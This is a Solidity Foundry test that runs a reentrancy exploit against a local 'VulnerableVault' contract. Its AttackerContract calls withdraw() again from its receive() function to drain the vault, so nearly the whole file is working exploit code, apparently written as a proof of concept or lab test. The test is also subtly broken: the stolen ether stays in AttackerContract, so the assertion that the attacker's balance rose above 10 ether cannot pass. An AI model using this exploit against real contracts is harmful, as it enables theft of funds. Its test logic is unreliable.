// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract ReentrancyExploitTest is Test {
    VulnerableVault target;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Deploy the vulnerable contract
        target = new VulnerableVault();
        
        // Fund accounts using vm.deal()
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 100 ether);
        vm.deal(address(target), 100 ether);
    }
    
    function test_ReentrancyViaWithdraw() public {
        // Record initial state
        uint256 initialBalance = address(target).balance;
        
        // Deploy the attacker contract
        AttackerContract attackerContract = new AttackerContract(payable(address(target)));
        
        // Execute exploit
        vm.startPrank(attacker);
        attackerContract.attack{value: 1 ether}(1 ether);
        vm.stopPrank();
        
        // Assert exploit success
        assertGt(attacker.balance, 10 ether, "Attacker should have stolen funds");
        assertLt(address(target).balance, initialBalance, "Contract should be drained");
    }
}

contract AttackerContract {
    VulnerableVault public target;
    uint256 public attackCount;
    uint256 public initialDeposit;
    
    constructor(address payable _target) payable {
        target = VulnerableVault(_target);
    }
    
    receive() external payable {
        // Re-enter the withdraw function
        if (attackCount < 5 && address(target).balance >= initialDeposit) {
            attackCount++;
            target.withdraw(initialDeposit);
        }
    }
    
    function attack(uint256 amount) external payable {
        initialDeposit = amount;
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}